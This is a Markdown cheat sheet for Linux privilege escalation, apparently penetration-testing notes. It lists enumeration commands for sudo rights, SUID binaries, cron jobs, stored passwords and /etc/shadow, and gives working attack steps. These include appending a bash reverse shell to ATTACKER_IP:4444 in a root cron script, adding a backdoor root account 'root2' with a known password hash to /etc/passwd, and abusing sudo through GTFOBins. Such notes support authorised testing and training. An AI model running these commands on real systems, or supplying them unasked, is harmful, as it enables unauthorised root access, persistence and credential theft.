### References

- [GTFOBins: SUID Exploits](https://gtfobins.github.io/)
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

---

!!! tip "Quick win order"
    1. `sudo -l` — misconfigured sudo is the most common Linux privesc
    2. SUID binaries: `find / -perm -4000 2>/dev/null` — check against GTFOBins
    3. Writable cron jobs: `cat /etc/cron* /etc/cron.d/*` and check script permissions
    4. Running as a service account? Check what the service binary does and if it's writable
    5. Check `/etc/passwd` for writable entries
    6. Kernel version: `uname -r` — only exploit if nothing else works, kernel exploits are noisy

## Host Enumeration

Identifying users on a compromised system helps locate privileged accounts or misconfigurations.
### Basic Information
```bash
whoami && id                 # Current user & groups
hostname && uname -a         # Hostname & system info
cat /etc/issue               # OS version
cat /etc/passwd              # User list
cat /etc/shadow              # If readable, privilege escalation possible
cat /etc/os-release          # OS release
dpkg -l                      # List all installed packages
```

### Check for Active Sessions
```bash
w
who
last
```

These commands reveal currently logged-in users, their activity, and recent logins.

---
## Cron Job Enumeration

Cron jobs execute scheduled tasks, and misconfigurations can allow privilege escalation.

### List Current User's Cron Jobs

```bash
crontab -l
```

### List System-Wide Cron Jobs

```bash
cat /etc/crontab
ls -lah /etc/cron*
```

If a root cron job executes a writable script, an attacker can modify it to execute a malicious payload.

### Finding Cron Jobs in Logs

```bash
grep "CRON" /var/log/syslog
```

This shows cron job execution history, useful for identifying recurring privileged tasks.

### Exploiting a Writable Cron Job

If a writable script is executed as root:

```bash
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /path/to/script.sh
```

Then start a Netcat listener:

```bash
nc -lvnp 4444
```

The payload executes on the next cron job run, providing a reverse shell.

---
## File Permission Enumeration

### Finding Writable Files and Directories

```bash
find / -writable -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

Note: Use the `strings` command to extract any readable text or strings from listed binary files.

Example:
```
strings /usr/bin/passwd
```

### Checking SUID and GUID Binaries

SUID binaries execute with the owner's privileges:

```bash
find / -perm -4000 -type f 2>/dev/null
```

GUID binaries execute with the group owner's privileges:

```bash
find / -perm -2000 -type f 2>/dev/null
```

These binaries can be exploited to gain elevated privileges.

---
## Searching for Sensitive Files

### Check for "password" recursively:
```bash
grep -iR --color=always 'password' .
```

### Checking for Stored Credentials

```bash
grep -r "password" /etc/
find / -name "*.conf" -exec grep -i password {} \; 2>/dev/null
```

These commands locate configuration files containing plaintext credentials.

### Checking for World-Readable Shadow Files

```bash
ls -l /etc/shadow
```

If readable by an unprivileged user, hashes can be extracted for cracking.

---
## Running Processes
### Owned by `root`
```shell
ps aux | grep root 
```

### Local Services
```shell
netstat -ano        # Network connections & Listening ports
ps aux              # List all system processes
ss -anp             # System processes
```

---
## Mounts

### List all drives that will be mounted at boot time
```shell
cat /etc/fstab
```

### List all mounted filesystems
```shell
mount
```

### View all available disks
```shell
lsblk
```

---
## Abusing Password Authentication
### Writing to `/etc/passwd`
First, generate a hash for the password, `w00t` in this case:
```shell
openssl passwd w00t
```

Next, place this into the `/etc/passwd` file:
```shell
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

Finally, switch users to root2 and use the new credentials `root2:w00t`:
```shell
su root2
```

---
## Abusing Sudo

List all allowed sudo commands for the current user:
```sh
sudo -l
```

```sh
joe@debian-privesc:~$ sudo -l
[sudo] password for joe:
Matching Defaults entries for joe on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on debian-privesc:
    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```

The above shows the current user has sudo privileges to crontab, tcpdumb, and apt-get

Use [GTFOBins](https://gtfobins.github.io/) to look for PE pathways if `sudo` can be performed by the user.